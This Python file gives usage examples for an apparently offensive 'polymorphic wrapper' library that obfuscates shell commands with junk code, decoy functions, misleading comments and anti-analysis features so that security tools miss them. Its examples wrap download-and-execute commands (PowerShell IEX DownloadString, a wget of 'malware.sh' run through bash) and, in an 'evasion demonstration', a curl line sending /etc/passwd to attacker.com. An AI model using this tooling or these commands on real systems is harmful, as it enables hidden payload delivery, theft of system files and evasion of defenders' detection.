#!/usr/bin/env python3
"""
Enhanced Polymorphic Wrapper - Practical Usage Examples
Demonstrates real-world scenarios and configurations
"""

from polymorphic_wrapper_enhanced import (
    create_enhanced_polymorphic_wrapper,
    EnhancedPolymorphicEncoder,
    EnhancedObfuscationConfig,
)
import json


def example_1_basic_python_wrapper():
    """Example 1: Generate a basic Python wrapper"""
    print("\n" + "="*80)
    print("EXAMPLE 1: Basic Python Wrapper")
    print("="*80)

    command = "powershell.exe -NoProfile -Command Get-Process"
    result = create_enhanced_polymorphic_wrapper(
        command=command,
        output_format="python",
        iterations=3
    )

    print(f"\n[*] Command: {command}")
    print(f"[*] Format: {result['format']}")
    print(f"[*] Size: {len(result['wrapper'])} bytes")
    print(f"[*] Hash: {result['command_hash']}")
    print(f"[*] Techniques Applied:")
    for tech in result['techniques']:
        print(f"    - {tech}")

    print(f"\n[*] Strategy Distribution:")
    for strategy, count in result['statistics']['strategy_distribution'].items():
        print(f"    {strategy}: {count}")

    print(f"\n[*] Generated Wrapper (first 500 chars):")
    print(result['wrapper'][:500])
    print("    ...")


def example_2_multi_format_generation():
    """Example 2: Generate wrapper in multiple formats"""
    print("\n" + "="*80)
    print("EXAMPLE 2: Multi-Format Generation")
    print("="*80)

    command = "calc.exe"
    formats = {
        "python": "Python 3.7+",
        "vbs": "Windows VBScript",
        "powershell": "Windows PowerShell",
        "bash": "Linux/Unix Bash"
    }

    print(f"\n[*] Command: {command}\n")

    for fmt, description in formats.items():
        result = create_enhanced_polymorphic_wrapper(
            command=command,
            output_format=fmt,
            iterations=2
        )
        print(f"[*] Format: {fmt.upper()} ({description})")
        print(f"    Size: {len(result['wrapper']):5d} bytes")
        print(f"    Iterations: {result['iterations']}")
        print(f"    Obfuscation: {result['obfuscation_level']}")


def example_3_custom_obfuscation_levels():
    """Example 3: Different obfuscation levels"""
    print("\n" + "="*80)
    print("EXAMPLE 3: Obfuscation Levels")
    print("="*80)

    command = "whoami"

    levels = {
        "MINIMAL": EnhancedObfuscationConfig(
            add_junk_code=False,
            add_dead_code=False,
            add_variable_swapping=False,
            add_decoy_functions=False,
        ),
        "STANDARD": EnhancedObfuscationConfig(
            add_junk_code=True,
            add_dead_code=False,
            add_variable_swapping=True,
            add_decoy_functions=False,
        ),
        "HIGH": EnhancedObfuscationConfig(
            add_junk_code=True,
            add_dead_code=True,
            add_variable_swapping=True,
            add_decoy_functions=False,
        ),
        "MAXIMUM": EnhancedObfuscationConfig(
            add_junk_code=True,
            add_dead_code=True,
            add_variable_swapping=True,
            add_decoy_functions=True,
            junk_code_percentage=50,
            dead_code_percentage=30,
        ),
    }

    print(f"\n[*] Command: {command}\n")

    for level_name, config in levels.items():
        encoder = EnhancedPolymorphicEncoder(config)
        payload = encoder.encode(command)
        decoder_lines = len(payload['decoder_code'].split('\n'))
        decoder_size = len(payload['decoder_code'])

        print(f"[*] {level_name:10s} - Lines: {decoder_lines:2d}, Size: {decoder_size:4d} bytes")


def example_4_batch_wrapper_generation():
    """Example 4: Generate multiple wrappers for different commands"""
    print("\n" + "="*80)
    print("EXAMPLE 4: Batch Wrapper Generation")
    print("="*80)

    commands = [
        "powershell.exe -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://example.com/ps1')",
        "cmd.exe /c tasklist",
        "wget http://example.com/malware.sh -O /tmp/file.sh && bash /tmp/file.sh",
        "python3 -c \"import os; os.system('id')\"",
    ]

    print(f"\n[*] Generating {len(commands)} wrappers...\n")

    results = {}
    for i, cmd in enumerate(commands, 1):
        result = create_enhanced_polymorphic_wrapper(
            command=cmd,
            output_format="python",
            iterations=2
        )

        results[f"wrapper_{i}"] = {
            "command": cmd[:50] + "..." if len(cmd) > 50 else cmd,
            "hash": result['command_hash'],
            "size": len(result['wrapper']),
            "strategies": list(result['statistics']['strategy_distribution'].keys()),
        }

        print(f"[*] Wrapper {i}:")
        print(f"    Command: {cmd[:60]}...")
        print(f"    Hash: {result['command_hash']}")
        print(f"    Size: {len(result['wrapper'])} bytes")
        print()


def example_5_strategy_analysis():
    """Example 5: Analyze strategy distribution over many invocations"""
    print("\n" + "="*80)
    print("EXAMPLE 5: Strategy Distribution Analysis")
    print("="*80)

    encoder = EnhancedPolymorphicEncoder()
    command = "test_payload"
    invocations = 100

    print(f"\n[*] Running {invocations} encoding invocations...")

    for _ in range(invocations):
        encoder.encode(command)

    stats = encoder.get_statistics()

    print(f"\n[*] Results:")
    print(f"    Total Invocations: {stats['total_invocations']}")
    print(f"    Unique Strategies: {stats['unique_strategies_used']}")
    print(f"\n[*] Strategy Distribution:")

    total = stats['total_invocations']
    for strategy, count in sorted(stats['strategy_distribution'].items(),
                                   key=lambda x: x[1], reverse=True):
        percentage = (count / total * 100)
        bar_length = int(percentage / 5)
        bar = "█" * bar_length
        print(f"    {strategy:15s} {count:3d} ({percentage:5.1f}%) {bar}")


def example_6_evasion_demonstration():
    """Example 6: Demonstrate evasion capabilities"""
    print("\n" + "="*80)
    print("EXAMPLE 6: Evasion Capabilities Demonstration")
    print("="*80)

    # Sensitive command that should be hidden
    sensitive_command = "curl http://attacker.com/steal?data=$(cat /etc/passwd)"

    config = EnhancedObfuscationConfig(
        add_junk_code=True,
        add_dead_code=True,
        add_variable_swapping=True,
        add_decoy_functions=True,
        add_misleading_comments=True,
    )

    encoder = EnhancedPolymorphicEncoder(config)

    print(f"\n[*] Original Command:")
    print(f"    {sensitive_command}")

    print(f"\n[*] Encoding with MAXIMUM obfuscation...")

    payload = encoder.encode(sensitive_command)

    print(f"\n[*] Encoded Command:")
    print(f"    {payload['encoded_data'][:80]}...")

    print(f"\n[*] Generated Decoder (showing obfuscation):")
    decoder_lines = payload['decoder_code'].split('\n')[:10]
    for i, line in enumerate(decoder_lines, 1):
        print(f"    {i:2d}: {line}")

    print(f"\n[*] Evasion Features Applied:")
    print(f"    ✓ Encoding Strategy: {payload['strategy']}")
    print(f"    ✓ Dead Code Blocks: Present")
    print(f"    ✓ Junk Code Injection: Present")
    print(f"    ✓ Variable Swapping: Present")
    print(f"    ✓ Misleading Comments: Present")
    print(f"    ✓ Command Hidden: ✓ (not visible in wrapper)")


def example_7_custom_configuration():
    """Example 7: Advanced custom configuration"""
    print("\n" + "="*80)
    print("EXAMPLE 7: Advanced Custom Configuration")
    print("="*80)

    command = "netstat -ano | findstr :4444"

    # Create a highly tuned configuration
    config = EnhancedObfuscationConfig(
        strategies=None,  # Use all strategies
        randomize_order=True,
        add_junk_code=True,
        add_dead_code=True,
        add_variable_swapping=True,
        junk_code_percentage=45,
        dead_code_percentage=25,
        chunk_size=8,  # Smaller chunks for more fragmentation
        rotation_factor=5,
        obfuscation_iterations=2,
        add_anti_analysis=True,
        output_format="python",
        track_invocations=True,
        add_misleading_comments=True,
        add_decoy_functions=True,
    )

    encoder = EnhancedPolymorphicEncoder(config)

    print(f"\n[*] Configuration:")
    print(f"    Junk Code: 45%")
    print(f"    Dead Code: 25%")
    print(f"    Variable Swapping: Enabled")
    print(f"    Decoy Functions: Enabled")
    print(f"    Misleading Comments: Enabled")
    print(f"    Chunk Size: 8 bytes")
    print(f"    Rotation Factor: 5")

    print(f"\n[*] Command: {command}")

    # Generate multiple iterations
    for iteration in range(3):
        payload = encoder.encode(command)
        print(f"\n[*] Iteration {iteration + 1}:")
        print(f"    Strategy: {payload['strategy']}")
        print(f"    Decoder Function: {payload['decoder_name']}")
        print(f"    Code Size: {len(payload['decoder_code'])} bytes")


def example_8_output_to_files():
    """Example 8: Save generated wrappers to files"""
    print("\n" + "="*80)
    print("EXAMPLE 8: Saving Wrappers to Files")
    print("="*80)

    command = "systemctl status nginx"
    formats = {
        "python": "py",
        "bash": "sh",
        "powershell": "ps1",
    }

    print(f"\n[*] Command: {command}\n")

    for fmt, extension in formats.items():
        result = create_enhanced_polymorphic_wrapper(
            command=command,
            output_format=fmt,
            iterations=3
        )

        filename = f"/tmp/wrapper_example.{extension}"

        # In real usage, you would save to file
        # with open(filename, 'w') as f:
        #     f.write(result['wrapper'])

        print(f"[*] Would save to: {filename}")
        print(f"    Format: {fmt.upper()}")
        print(f"    Size: {len(result['wrapper'])} bytes")
        print(f"    Iterations: {result['iterations']}")
        print()


def example_9_performance_analysis():
    """Example 9: Performance and size analysis"""
    print("\n" + "="*80)
    print("EXAMPLE 9: Performance & Size Analysis")
    print("="*80)

    test_commands = [
        ("Simple", "id"),
        ("Medium", "ps aux | grep node"),
        ("Complex", "curl http://example.com/api?key=value&format=json | jq '.data[]'"),
    ]

    print(f"\n{'Command':<20} {'Original':<10} {'Python':<10} {'Bash':<10} {'Increase':<10}")
    print("-" * 60)

    for name, command in test_commands:
        original_size = len(command.encode())

        py_result = create_enhanced_polymorphic_wrapper(command, output_format="python", iterations=2)
        py_size = len(py_result['wrapper'])

        bash_result = create_enhanced_polymorphic_wrapper(command, output_format="bash", iterations=2)
        bash_size = len(bash_result['wrapper'])

        increase_percent = ((py_size - original_size) / original_size * 100)

        print(f"{name:<20} {original_size:<10} {py_size:<10} {bash_size:<10} {increase_percent:>8.0f}%")


def example_10_statistics_and_reporting():
    """Example 10: Generate statistics report"""
    print("\n" + "="*80)
    print("EXAMPLE 10: Statistics & Reporting")
    print("="*80)

    command = "whoami"
    config = EnhancedObfuscationConfig()
    encoder = EnhancedPolymorphicEncoder(config)

    print(f"\n[*] Generating 50 wrappers for statistics...")

    for _ in range(50):
        encoder.encode(command)

    stats = encoder.get_statistics()

    report = {
        "timestamp": "2024-01-01T00:00:00Z",
        "command": command,
        "total_invocations": stats['total_invocations'],
        "unique_strategies": stats['unique_strategies_used'],
        "strategy_distribution": stats['strategy_distribution'],
        "coverage_percentage": (stats['unique_strategies_used'] / 8 * 100),
    }

    print(f"\n[*] Statistics Report:")
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    print("\n" + "="*80)
    print("ENHANCED POLYMORPHIC WRAPPER - PRACTICAL EXAMPLES")
    print("="*80)

    # Run all examples
    example_1_basic_python_wrapper()
    example_2_multi_format_generation()
    example_3_custom_obfuscation_levels()
    example_4_batch_wrapper_generation()
    example_5_strategy_analysis()
    example_6_evasion_demonstration()
    example_7_custom_configuration()
    example_8_output_to_files()
    example_9_performance_analysis()
    example_10_statistics_and_reporting()

    print("\n" + "="*80)
    print("ALL EXAMPLES COMPLETED")
    print("="*80 + "\n")
